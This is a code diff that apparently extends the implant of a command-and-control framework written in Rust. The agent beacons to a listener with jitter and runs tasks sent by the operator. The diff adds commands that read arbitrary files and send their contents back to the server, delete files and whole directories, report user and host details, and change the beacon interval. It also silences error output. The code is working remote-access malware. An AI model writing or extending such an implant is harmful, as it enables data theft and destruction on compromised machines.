@@ -49,12 +49,14 @@ pub async fn run(config: Config) -> Result<(), Error> {
         config.listener.port.to_owned(),
     );
 
+    let mut sleeptime = config.sleep.clone();
+
     let mut rad = RegisterAgentData::new(
         agent_name.to_string(),
-        hostname,
-        os,
-        arch,
-        listener_url,
+        hostname.to_string(),
+        os.to_string(),
+        arch.to_string(),
+        listener_url.to_string(),
         config.my_public_key,
     );
     let rad_json = serde_json::to_string(&rad.clone()).unwrap();
@@ -63,7 +65,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
     let mut registered = false;
     while !registered {
         thread::sleep(
-            random_sleeptime(config.sleep.to_owned(), config.jitter.to_owned())
+            random_sleeptime(sleeptime.to_owned(), config.jitter.to_owned())
         );
     
         // Register agent
@@ -73,7 +75,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                 resp
             }
             Err(e) => {
-                println!("Error registration: {:?}", e);
+                // println!("Error registration: {:?}", e);
                 continue;
             }
         };
@@ -88,7 +90,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
         // TODO: Implement graceful shutdown.
 
         thread::sleep(
-            random_sleeptime(config.sleep.to_owned(), config.jitter.to_owned())
+            random_sleeptime(sleeptime.to_owned(), config.jitter.to_owned())
         );
 
         // Get task
@@ -124,12 +126,12 @@ pub async fn run(config: Config) -> Result<(), Error> {
         }
 
         match task_args[0].as_str() {
-            "cd" => {
-                match std::env::set_current_dir(task_args[1].as_str()) {
-                    Ok(result) => {
+            "cat" => {
+                match std::fs::read_to_string(task_args[1].as_str()) {
+                    Ok(contents) => {
                         post_task_result(
                             &mut hconnect,
-                            "The current directory chanted successfully.".as_bytes(),
+                            contents.as_bytes(),
                             agent_name.to_string(),
                             config.my_secret_key.clone(),
                             config.server_public_key.clone(),
@@ -146,6 +148,47 @@ pub async fn run(config: Config) -> Result<(), Error> {
                     }
                 }
             }
+            "cd" => {
+                match std::env::set_current_dir(task_args[1].as_str()) {
+                    Ok(result) => {
+                        post_task_result(
+                            &mut hconnect,
+                            "The current directory changed successfully.".as_bytes(),
+                            agent_name.to_string(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                        ).await;
+                    }
+                    Err(e) => {
+                        post_task_result(
+                            &mut hconnect,
+                            e.to_string().as_bytes(),
+                            agent_name.to_string(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                        ).await;
+                    }
+                }
+            }
+            "info" => {
+                let mut output = String::new();
+                output = output + "\n";
+                output = output + format!("{:<12} : {}\n", "NAME", agent_name.to_string()).as_str();
+                output = output + format!("{:<12} : {}\n", "HOSTNAME", hostname.to_string()).as_str();
+                output = output + format!("{:<12} : {}\n", "OS", 
+                    format!("{}/{}", os.to_string(), arch.to_string())).as_str();
+                output = output + format!("{:<12} : {}\n", "LISTENER", listener_url.to_string()).as_str();
+                output = output + format!("{:<12} : {}\n", "SLEEP", sleeptime.to_string()).as_str();
+                output = output + format!("{:<12} : {}\n", "JITTER", config.jitter.to_string()).as_str();
+
+                post_task_result(
+                    &mut hconnect,
+                    output.as_bytes(),
+                    agent_name.to_string(),
+                    config.my_secret_key.clone(),
+                    config.server_public_key.clone(),
+                ).await;
+            }
             "ls" => {
                 match std::fs::read_dir(task_args[1].as_str()) {
                     Ok(result) => {
@@ -156,15 +199,19 @@ pub async fn run(config: Config) -> Result<(), Error> {
                         for path in result {
                             if let Ok(entry) = path {
                                 let entry_name = &entry.path().to_string_lossy().to_string();
-                                let entry_name_2 = re.replace_all(entry_name, "/");
-                                let entry_name_3 = entry_name_2.split("/").last().unwrap().to_string();
+                                let entry_name = re.replace_all(entry_name, "/");
+                                let entry_name = entry_name.split("/").last().unwrap().to_string();
 
                                 if let Ok(metadata) = entry.metadata() {
                                     output = output + format!(
-                                        "{:<20} {}\n", entry_name_3, metadata.len()).as_str();
+                                        "{:<1} {:<20} {}\n",
+                                        if metadata.is_dir() { "D" } else { "F" },
+                                        entry_name,
+                                        metadata.len()
+                                    ).as_str();
                                 } else {
                                     output = output + format!(
-                                        "{}", entry_name_3).as_str();
+                                        "{}", entry_name).as_str();
                                 }
                             }
                         }
@@ -207,6 +254,52 @@ pub async fn run(config: Config) -> Result<(), Error> {
                             config.my_secret_key.clone(),
                             config.server_public_key.clone(),
                         ).await;
+                    }
+                }
+            }
+            "rm" => {
+                if task_args.len() == 2 {
+                    match std::fs::remove_file(task_args[1].as_str()) {
+                        Ok(_) => {
+                            post_task_result(
+                                &mut hconnect,
+                                "The directory removed successfully.".as_bytes(),
+                                agent_name.to_string(),
+                                config.my_secret_key.clone(),
+                                config.server_public_key.clone(),
+                            ).await;
+                        }
+                        Err(e) => {
+                            post_task_result(
+                                &mut hconnect,
+                                e.to_string().as_bytes(),
+                                agent_name.to_string(),
+                                config.my_secret_key.clone(),
+                                config.server_public_key.clone(),
+                            ).await;
+                        }
+                    }
+                } else {
+                    // When the `-r` flag is specified,
+                    match std::fs::remove_dir_all(task_args[1].as_str()) {
+                        Ok(_) => {
+                            post_task_result(
+                                &mut hconnect,
+                                "The directory removed successfully.".as_bytes(),
+                                agent_name.to_string(),
+                                config.my_secret_key.clone(),
+                                config.server_public_key.clone(),
+                            ).await;
+                        }
+                        Err(e) => {
+                            post_task_result(
+                                &mut hconnect,
+                                e.to_string().as_bytes(),
+                                agent_name.to_string(),
+                                config.my_secret_key.clone(),
+                                config.server_public_key.clone(),
+                            ).await;
+                        }
                     }
                 }
             }
@@ -253,6 +346,27 @@ pub async fn run(config: Config) -> Result<(), Error> {
                         ).await;
                     }
                 }
+            }
+            "sleep" => {
+                sleeptime = task_args[1].parse().unwrap();
+
+                post_task_result(
+                    &mut hconnect,
+                    "The sleep time changed successfully.".as_bytes(),
+                    agent_name.to_string(),
+                    config.my_secret_key.clone(),
+                    config.server_public_key.clone(),
+                ).await;
+            }
+            "whoami" => {
+                let username = format!("{}\\{}", whoami::hostname(), whoami::username());
+                post_task_result(
+                    &mut hconnect,
+                    username.as_bytes(),
+                    agent_name.to_string(),
+                    config.my_secret_key.clone(),
+                    config.server_public_key.clone(),
+                ).await;
             }
             _ => {
                 continue;
